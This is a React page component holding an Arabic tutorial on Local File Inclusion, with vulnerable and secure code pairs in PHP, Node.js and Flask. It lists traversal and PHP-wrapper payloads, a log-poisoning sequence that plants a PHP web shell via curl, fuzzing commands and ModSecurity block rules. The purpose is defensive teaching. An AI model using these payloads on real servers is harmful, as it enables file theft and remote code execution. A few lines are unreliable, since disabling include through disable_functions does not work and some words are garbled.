import Link from 'next/link'

export default function LfiPage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      {/* Hero Section */}
      <section className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">📁</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">تضمين الملفات المحلية</h1>
            <p className="text-xl text-gray-500 mt-1">Local File Inclusion (LFI)</p>
          </div>
        </div>
        <div className="bg-danger-50 border border-danger-200 rounded-lg p-4 mb-6">
          <span className="inline-block bg-danger-600 text-white px-3 py-1 rounded-full text-sm font-medium mb-2">
            خطيرة جداً
          </span>
          <p className="text-gray-700 mb-0">
            ثغرة تسمح للمهاجم بقراءة ملفات حساسة من الخادم أو تنفيذ أكواد ضارة عبر تضمين ملفات محلية غير مصرح بها.
          </p>
        </div>
      </section>

      {/* Definition Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تعريف تضمين الملفات المحلية (LFI)</h2>
        <p>
          تضمين الملفات المحلية (Local File Inclusion - LFI) هو ثغرة أمنية تسمح للمهاجم بالتحكم في ملف يتم تضمينه وتحميله من الخادم. تحدث هذه الثغرة عندما يأخذ تطبيق الويب مسار ملف من مدخلات المستخدم ويمرره مباشرة إلى دالة التضمين دون تحقق أو تقييد كافٍ.
        </p>
        <p>
          هذه الثغرة خطيرة لأنها قد تؤدي إلى:
        </p>
        <ul>
          <li><strong>قراءة ملفات حساسة:</strong> الوصول إلى ملفات نظامية مثل <code>/etc/passwd</code> أو ملفات تكوين التطبيق</li>
          <li><strong>تسريب بيانات المستخدمين:</strong> قراءة ملفات تحتوي على كلمات مرور أو مفاتيح تشفير</li>
          <li><strong>تنفيذ أكواد ضارة (RCE):</strong> في بعض الحالات، يمكن للمهاجم تنفيذ كود خبيث على الخادم</li>
          <li><strong>التجسس على التطبيق:</strong> فهم بنية الملفات والمجلدات للخادم</li>
          <li><strong>تعطيل النظام:</strong> قراءة ملفات سجل النظام أو ملفات مهمة أخرى</li>
        </ul>
      </section>

      {/* Types Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع تضمين الملفات المحلية</h2>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">1. Basic LFI (التضمين الأساسي)</h3>
          <p>
            هذا هو النوع الأبسط حيث يستخدم المهاجم مسارات نسبية أو مطلقة للوصول إلى ملفات على الخادم.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# أمثلة على هجمات Basic LFI
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../var/log/apache2/access.log
?page=../../../../proc/self/environ
?page=C:\\windows\\system32\\drivers\\etc\\hosts`}</code></pre>
          </div>
        </div>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">2. LFI with Null Bytes (التضمين مع بايتات فارغة)</h3>
          <p>
            في إصدارات PHP القديمة (أقل من 5.3.4)، يمكن استخدام البايت الفارغ <code>%00</code> لقطع امتداد الملف وإجبار النظام على قراءة أي ملف.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# مثال على هجوم Null Byte Injection
?page=../../../../etc/passwd%00
?page=../../../../etc/passwd%2500

# ملاحظة: هذه الثغرة تم إصلاحها في PHP 5.3.4 وما بعدها`}</code></pre>
          </div>
        </div>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">3. LFI with Path Truncation (التضمين مع اقتطاع المسار)</h3>
          <p>
            يستخدم المهاجم تقنيات لتجاوز القيود على امتداد الملف عن طريق تقليص طول المسار أو استخدام نقاط تفادي (..).
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# مثال على Path Truncation
?page=....//....//....//etc/passwd
?page=..%252f..%252f..%252fetc/passwd
?page=....\/....\/....\/etc/passwd

# استخدام نقاط التفادي بشكل متكرر
?page=../../../../../../../../etc/passwd`}</code></pre>
          </div>
        </div>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">4. LFI with PHP Wrappers (التضمين مع لفافات PHP)</h3>
          <p>
            تسمح لفافات PHP بتحويل تدفقات البيانات وتنفيذ أكواد ضارة. هذه التقنية خطيرة جداً لأنها قد تؤدي إلى تنفيذ أكواد عbitrary.
          </p>

          <h4 className="text-xl font-semibold text-gray-800">أ. LFI with php://filter</h4>
          <p>
            تسمح بقراءة ملفات PHP كنص عادي بدلاً من تنفيذها.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# قراءة كود PHP كنص
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/read=convert.base64-encode/resource=index.php

# فك تشفير النتيجة باستخدام base64
echo "cGFzc3dvcmQ9MTIzNDU2" | base64 -d`}</code></pre>
          </div>

          <h4 className="text-xl font-semibold text-gray-800">ب. LFI with php://input</h4>
          <p>
            تسمح بتنفيذ أكواد PHP من خلال إرسال الكود في جسم الطلب.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# POST request مع كود PHP ضار
POST /vulnerable.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>`}</code></pre>
          </div>

          <h4 className="text-xl font-semibold text-gray-800">ج. LFI with data:// wrapper</h4>
          <p>
            تسمح بتنفيذ أكواد PHP مباشرة من بيانات مشفّرة.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# تنفيذ كود PHP عبر data://
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# أو باستخدام text/plain
?page=data://text/plain,<?php system('id'); ?>`}</code></pre>
          </div>

          <h4 className="text-xl font-semibold text-gray-800">د. LFI with phar:// wrapper</h4>
          <p>
            تسمح بالوصول إلى محتوى ملفات داخل أرشيفات phar.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# استخدام phar:// للوصول إلى ملفات داخل أرشيف
?page=phar://archive.zip/malicious.php
?page=phar://archive.tar/internal_file.txt`}</code></pre>
          </div>
        </div>
      </section>

      {/* Code Examples Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أمثلة عملية على الأكواد</h2>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 1: صفحة عرض الملفات في PHP</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Vulnerable Code */}
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف ❌</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`<?php
// index.php - كود ضعيف
$page = $_GET['page'];

// دمج المدخلات مباشرة مع مسار الملفات
$file = "includes/" . $page;

// تضمين الملف بدون أي تحقق
include($file);
?>`}</code></pre>
            </div>
            <div className="bg-danger-50 border border-danger-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-danger-700 mb-0">
                <strong>المشكلة:</strong> يتم استخدام مدخلات المستخدم مباشرة في دالة <code>include</code> بدون أي تحقق أو تنقية. يمكن للمهاجم التلاعب بالمسار للوصول لأي ملف.
              </p>
            </div>
          </div>

          {/* Secure Code */}
          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن ✅</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`<?php
// index.php - كود آمن
$page = $_GET['page'];

// قائمة بالملفات المسموح بها (whitelist)
$allowed_pages = [
    'home',
    'about',
    'contact',
    'services'
];

// التحقق من أن الملف مسموح به
if (in_array($page, $allowed_pages)) {
    // استخدام basename لمنع directory traversal
    $safe_file = basename($page);
    $file = "includes/" . $safe_file . ".php";
    
    // التحقق من وجود الملف
    if (file_exists($file)) {
        include($file);
    } else {
        include("includes/404.php");
    }
} else {
    include("includes/error.php");
}
?>`}</code></pre>
            </div>
            <div className="bg-success-50 border border-success-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-success-700 mb-0">
                <strong>الحل:</strong> استخدام قائمة بيضاء (whitelist) للملفات المسموح بها، ودالة <code>basename</code> لمنع directory traversal، والتحقق من وجود الملف قبل التضمين.
              </p>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 2: صفحة تحميل اللغة في Node.js</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Vulnerable Code */}
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف ❌</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Node.js - كود ضعيف
const express = require('express');
const fs = require('fs');
const path = require('path');

app.get('/lang', (req, res) => {
  const lang = req.query.lang;
  
  // بناء مسار الملف مباشرة من مدخلات المستخدم
  const filePath = path.join(
    __dirname, 'locales', lang + '.json'
  );
  
  // قراءة الملف بدون تحقق
  const content = fs.readFileSync(filePath, 'utf8');
  res.json(JSON.parse(content));
});`}</code></pre>
            </div>
          </div>

          {/* Secure Code */}
          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن ✅</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Node.js - كود آمن
const express = require('express');
const fs = require('fs');
const path = require('path');

// قائمة اللغات المسموح بها
const ALLOWED_LANGS = ['en', 'ar', 'fr', 'es'];

app.get('/lang', (req, res) => {
  const lang = req.query.lang;
  
  // التحقق من أن اللغة مسموحة
  if (!ALLOWED_LANGS.includes(lang)) {
    return res.status(400).json({ error: 'Invalid language' });
  }
  
  // بناء المسار بأمان
  const localesDir = path.join(__dirname, 'locales');
  const filePath = path.join(localesDir, lang + '.json');
  
  // التحقق من أن المسار داخل المجلد المحدد
  if (!filePath.startsWith(localesDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  try {
    const content = fs.readFileSync(filePath, 'utf8');
    res.json(JSON.parse(content));
  } catch (err) {
    res.status(404).json({ error: 'Language not found' });
  }
});`}</code></pre>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 3: صفحة عرض الصورة في Python</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف ❌</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python Flask - كود ضعيف
from flask import Flask, request, send_file

@app.route('/image')
def get_image():
    filename = request.args.get('name')
    
    # بناء المسار مباشرة
    filepath = f"static/images/{filename}"
    
    # إرسال الملف بدون تحقق
    return send_file(filepath)`}</code></pre>
            </div>
          </div>

          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن ✅</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python Flask - كود آمن
import os
from flask import Flask, request, send_file, abort

ALLOWED_IMAGES = {'logo.png', 'banner.jpg', 'icon.svg'}

@app.route('/image')
def get_image():
    filename = request.args.get('name')
    
    # التحقق من الامتداد
    if not filename:
        abort(400)
    
    # التحقق من أن الملف في القائمة البيضاء
    if filename not in ALLOWED_IMAGES:
        abort(403)
    
    # بناء المسار بأمان
    images_dir = os.path.abspath('static/images')
    filepath = os.path.join(images_dir, filename)
    
    # التحقق من أن المسار داخل المجلد الصحيح
    if not filepath.startswith(images_dir):
        abort(403)
    
    if not os.path.exists(filepath):
        abort(404)
    
    return send_file(filepath)`}</code></pre>
            </div>
          </div>
        </div>
      </section>

      {/* Detection Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تكتشف ثغرة LFI</h2>

        <h3 className="text-2xl font-semibold text-gray-800">علامات وجود الثغرة</h3>
        <ul>
          <li>ظهور محتوى ملفات نظامية في استجابة الخادم (مثل محتوى <code>/etc/passwd</code>)</li>
          <li>رسائل خطأ تشير إلى عدم وجود ملف في مسار محدد</li>
          <li>قدرة التلاعب بمسارات الملفات عبر <code>../</code> أو <code>..\\</code></li>
          <li>إمكانية قراءة ملفات PHP كنص عادي عبر <code>php://filter</code></li>
          <li>تغيير سلوك التطبيق عند تغيير قيمة مسار الملف</li>
        </ul>

        <h3 className="text-2xl font-semibold text-gray-800">أدوات الاكتشاف</h3>
        <ul>
          <li><strong>Burp Suite:</strong> منصة شاملة لاختبار أمن التطبيقات مع Proxy و Intruder</li>
          <li><strong>OWASP ZAP:</strong> أداة مجانية لفحص ثغرات المواقع</li>
          <li><strong>Fuff:</strong> أداة سريعة لـ fuzzing مسارات الملفات</li>
          <li><strong>Dirsearch:</strong> أداة لاكتشاف المجلدات والملفات المخفية</li>
          <li><strong>Nikto:</strong> ماسح أمني شامل للخوادم</li>
        </ul>

        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# مثال على استخدام Fuff لاكتشاف LFI
fuff -u "http://target.com/page=FUZZ" -w wordlist.txt -fs 4242

# مثال على استخدام Burp Suite Intruder
# 1. أرسل الطلب إلى Intruder
# 2. حدد موقع الـ payload في معامل page
# 3. استخدم wordlist يحتوي على مسارات LFI
# 4. راقب الفروق في حجم الاستجابة أو الرمز`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">حركات اختبار شائعة</h3>
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
          <ul className="mb-0">
            <li><code>../../../../etc/passwd</code> - اختبار قراءة ملفات Linux</li>
            <li><code>..\..\..\windows\system32\drivers\etc\hosts</code> - اختبار Windows</li>
            <li><code>php://filter/convert.base64-encode/resource=index.php</code> - قراءة كود PHP</li>
            <li><code>/proc/self/environ</code> - قراءة متغيرات البيئة</li>
            <li><code>/proc/self/fd/10</code> - محاولة الوصول لملف الجلسة</li>
            <li><code>../../../../var/log/apache2/access.log</code> - استغلال ملفات السجل</li>
          </ul>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">تقنيات الاستغلال المتقدمة</h3>

        <div className="mb-6">
          <h4 className="text-xl font-semibold text-gray-800">استغلال Log Poisoning</h4>
          <p>
            يمكن للمهاجم حقن أكواد PHP ضارة في ملفات السجل ثم تضمينها عبر LFI.
          </p>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`# الخطوة 1: حقن كود PHP في ملف السجل
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"

# الخطوة 2: تضمين ملف السجل عبر LFI
# http://target.com/page=../../../../var/log/apache2/access.log&cmd=id

# أو حقن في User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# ثم تضمين ملف السجل
# http://target.com/page=../../../../var/log/apache2/access.log&cmd=whoami`}</code></pre>
          </div>
        </div>
      </section>

      {/* Prevention Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تمنع ثغرة LFI</h2>

        <h3 className="text-2xl font-semibold text-gray-800">1. استخدام قائمة بيضاء (Whitelisting)</h3>
        <p>
          هذه هي الطريقة الأكثر أماناً. حدد مسبقاً الملفات المسموح بها فقط ولا تسمح بأي ملفات أخرى.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`<?php
// مثال في PHP
$allowed = ['home', 'about', 'contact'];

$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include("pages/" . $page . ".php");
} else {
    include("pages/404.php");
}
?>`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">2. استخدام basename() لمنع Directory Traversal</h3>
        <p>
          دالة <code>basename()</code> تستخرج اسم الملف فقط من المسار الكامل، مما يمنع هجمات <code>../</code>.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`<?php
// مثال في PHP
$page = $_GET['page'];

// استخراج اسم الملف فقط (بدون المسار)
$safe_page = basename($page);

// الآن حتى لو أدخل المهاجم ../../etc/passwd
// سيعطي basename() فقط: passwd
$file = "pages/" . $safe_page . ".php";
include($file);
?>`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">3. التحقق من المسار باستخدام realpath()</h3>
        <p>
          تتأكد دالة <code>realpath()</code> من أن المسار النهائي يقع داخل المجلد المحدد.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`<?php
// مثال في PHP
$page = $_GET['page'];
$base_dir = '/var/www/html/pages/';

// بناء المسار الكامل
$requested_file = $base_dir . $page;
$real_path = realpath($requested_file);

// التحقق من أن المسار داخل المجلد الصحيح
if ($real_path && strpos($real_path, $base_dir) === 0) {
    include($real_path);
} else {
    include("pages/error.php");
}
?>`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">4. تعطيل دوال التضمين الخطيرة في PHP</h3>
        <p>
          يمكنك تعطيل بعض الدوال الخطيرة في ملف <code>php.ini</code>.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`; في ملف php.ini
; تعطيل دوال التضمين الخطيرة
disable_functions = include, include_once, require, require_once

; أو تعطيل لفافات PHP الخطيرة
allow_url_include = Off
allow_url_fopen = Off`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">5. استخدام Sandboxing و Open_basedir</h3>
        <p>
          تقييد وصول PHP للملفات خارج مجلد محدد باستخدام <code>open_basedir</code>.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`; في ملف php.ini أو .htaccess
; تحديد المجلدات المسموح بها فقط
open_basedir = /var/www/html:/tmp

; في Apache .htaccess
php_value open_basedir /var/www/html:/tmp`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">6. استخدام WAF (Web Application Firewall)</h3>
        <p>
          يمكن لـ WAF كشف ومنع أنماط LFI الشائعة.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# قواعد ModSecurity الشائعة لمنع LFI
SecRule ARGS|QUERY_STRING "@rx \.\.\/" \
    "id:1001,phase:1,block,msg:'Directory Traversal',"

SecRule ARGS|QUERY_STRING "@rx (php:\/\/|data:\/\/|phar:\/\/)" \
    "id:1002,phase:1,block,msg:'PHP Wrapper Attack',"

SecRule ARGS|QUERY_STRING "@rx (etc\/passwd|etc\/shadow)" \
    "id:1003,phase:1,block,msg:'LFI Attempt',"`}</code></pre>
        </div>
      </section>

      {/* Security Tips Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">نصائح أمنية مهمة</h2>

        <div className="bg-success-50 border border-success-200 rounded-lg p-6 mb-6">
          <div className="flex items-start gap-3">
            <span className="text-2xl">✅</span>
            <div>
              <h4 className="font-bold text-success-800 mb-2">القاعدة الذهبية</h4>
              <p className="mb-0 text-success-700">
                لا تثق أبداً في مدخلات المستخدم. جميع مسارات الملفات يجب أن تُتحقق من صحتها وتقيد بمجلد محدد.
              </p>
            </div>
          </div>
        </div>

        <ul>
          <li><strong>استخدم Whitelist دائماً:</strong> حدد الملفات المسموح بها مسبقاً ولا تسمح بأي ملفات أخرى</li>
          <li><strong>لا تستخدم المدخلات مباشرة:</strong> لا تدمج مدخلات المستخدم مع مسارات الملفات أبداً</li>
          <li><strong>استخدم basename():</strong> لاستخراج اسم الملف فقط ومنع Directory Traversal</li>
          <li><strong>تحقق من المسار النهائي:</strong> استخدم <code>realpath()</code> للتأكد من أن الملف داخل المجلد المحدد</li>
          <li><strong>قيّد صلاحيات PHP:</strong> استخدم <code>open_basedir</code> لتحديد المجلدات المسموح بها</li>
          <li><strong>عطّل الدوال الخطيرة:</strong> تعطيل <code>allow_url_include</code> و <code>allow_url_fopen</code></li>
          <li><strong>استخدم WAF:</strong> يمكن أن يساعد في كشف ومنع بعض هجمات LFI</li>
          <li><strong>حدّث PHP:</strong> استخدم أحدث إصدار من PHP لتلقي إصلاحات الأمان</li>
          <li><strong>راجع الكود بشكل أمني:</strong> افحص جميع الأكواد التي تتعامل مع تضمين الملفات</li>
          <li><strong>سجّل الأحداث:</strong> راقب سجلات الخادم لاكتشاف محاولات LFI</li>
        </ul>
      </section>

      {/* Common Mistakes Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">الأخطاء الشائعة التي يجب تجنبها</h2>

        <div className="space-y-4">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ استخدام مدخلات المستخدم مباشرة في include/require</h4>
            <p className="text-danger-700 mb-0">
              دمج مدخلات المستخدم مباشرة مع مسار الملف هو السبب الرئيسي لثغرات LFI. لا تفعل هذا أبداً.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ عدم استخدام basename() لمنع Directory Traversal</h4>
            <p className="text-danger-700 mb-0">
              حتى مع Whitelist، يجب استخدام <code>basename()</code> لمنع أي محاولات تجاوز المجلد.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ عدم التحقق من المسار النهائي</h4>
            <p className="text-danger-700 mb-0">
              عدم استخدام <code>realpath()</code> للتأكد من أن المسار النهائي يقع داخل المجلد المحدد.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ استخدام دوال include مع متغيرات غير موثوقة</h4>
            <p className="text-danger-700 mb-0">
              استخدام <code>include($variable)</code> بدون تحقق هو خطأ أمني فادح.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ تعطيل رسائل الخطأ بدون ت记录</h4>
            <p className="text-danger-700 mb-0">
              تعطيل رسائل الخطأ قد يخفي مشاكل أمنية. يجب تسجيل الأخطاء في ملفات السجل.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ عدم تقييد open_basedir</h4>
            <p className="text-danger-700 mb-0">
              عدم استخدام <code>open_basedir</code> يسمح لـ PHP بالوصول لأي ملف على النظام.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">❌ الاعتماد فقط على Client-side Validation</h4>
            <p className="text-danger-700 mb-0">
              التحقق من صحة المدخلات في الجهة العميلة فقط يمكن تجاوزه بسهولة. التحقق من الخادم مطلوب دائماً.
            </p>
          </div>
        </div>
      </section>

      {/* Severity Impact */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تأثير الثغرة ومدى خطورتها</h2>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">🔴</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على السرية</h4>
            <p className="text-danger-700 mb-0">مرتفع جداً - قراءة جميع ملفات النظام</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">🔴</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على النزاهة</h4>
            <p className="text-danger-700 mb-0">مرتفع - تعديل أو حقن ملفات ضارة</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">🔴</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على التوفر</h4>
            <p className="text-danger-700 mb-0">مرتفع - تعطيل النظام أو تنفيذ أوامر</p>
          </div>
        </div>

        <blockquote className="border-r-4 border-danger-500 pr-4 italic text-gray-600 my-6">
          تُعدّ ثغرات LFI من أكثر الثغرات شيوعاً في تطبيقات PHP. وفقاً لتقارير OWASP، تُصنّف ضمن أعلى 10 ثغرات أمنية في تطبيقات الويب.
        </blockquote>
      </section>

      {/* Navigation Section */}
      <section className="mt-16">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع أخرى من الثغرات</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link
            href="/vulnerabilities/xss"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">📜</span>
            <h4 className="font-bold text-gray-900 mb-1">XSS</h4>
            <p className="text-sm text-gray-600 mb-0">برمجة النصوص بين المواقع</p>
          </Link>
          <Link
            href="/vulnerabilities/sql-injection"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">💉</span>
            <h4 className="font-bold text-gray-900 mb-1">SQL Injection</h4>
            <p className="text-sm text-gray-600 mb-0">حقن SQL</p>
          </Link>
          <Link
            href="/vulnerabilities/csrf"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">🎣</span>
            <h4 className="font-bold text-gray-900 mb-1">CSRF</h4>
            <p className="text-sm text-gray-600 mb-0">تزوير الطلبات بين المواقع</p>
          </Link>
        </div>
        <div className="text-center mt-6">
          <Link
            href="/"
            className="inline-block bg-primary-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-primary-700 transition-colors"
          >
            العودة للرئيسية
          </Link>
        </div>
      </section>
    </div>
  )
}
